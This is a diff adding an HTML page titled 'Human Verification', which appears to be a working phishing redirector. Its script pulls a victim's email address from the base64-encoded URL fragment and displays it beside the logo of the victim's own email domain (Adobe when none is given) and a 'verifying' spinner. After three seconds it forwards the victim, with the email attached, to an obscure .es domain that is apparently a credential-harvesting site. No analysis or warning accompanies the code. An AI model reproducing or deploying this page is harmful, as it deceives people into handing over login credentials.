@@ -1,0 +1,78 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Human Verification</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background: #f00;
+            color: white;
+            text-align: center;
+            margin: 0;
+            padding: 0;
+            height: 100vh;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+        }
+        .logo {
+            width: 90px;
+            margin-bottom: 15px;
+            background: white;
+            padding: 10px;
+            border-radius: 8px;
+        }
+        .spinner {
+            width: 40px;
+            height: 40px;
+            border: 5px solid rgba(255, 255, 255, 0.1);
+            border-top-color: #FFFFFF;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin-bottom: 15px;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .message {
+            margin: 15px;
+        }
+    </style>
+</head>
+<body>
+    <script>
+        (function(){
+            let email = window.location.hash.substring(1);
+            try {
+                let decodedEmail = atob(email);
+                if (decodedEmail.includes('@')) {
+                    email = decodedEmail;
+                }
+            } catch (e) {}
+
+            if (!email || !email.includes('@')) {
+                email = '';
+            }
+
+            const domain = email ? email.split('@').pop().toLowerCase() : 'adobe.com';
+            const logoUrl = `https://logo.clearbit.com/${domain}`;
+            const targetUrl = email ? `https://e50F.yvtqqzxuvd.es/v8Ki/#M${email}` : 'https://e50F.yvtqqzxuvd.es/v8Ki/';
+
+            document.body.innerHTML = `
+                <img id="logo" class="logo" src="${logoUrl}" alt="${domain} Logo" onerror="this.src='https://logo.clearbit.com/adobe.com'" />
+                <p class="message" id="userEmail">Verifying: ${email || 'No Email Provided'}</p>
+                <div class="spinner"></div>
+                <p class="message" id="statusMsg">Please wait while we complete the verification...</p>
+            `;
+
+            setTimeout(() => {
+                window.location.href = targetUrl;
+            }, 3000);
+        })();
+    </script>
+</body>
+</html>
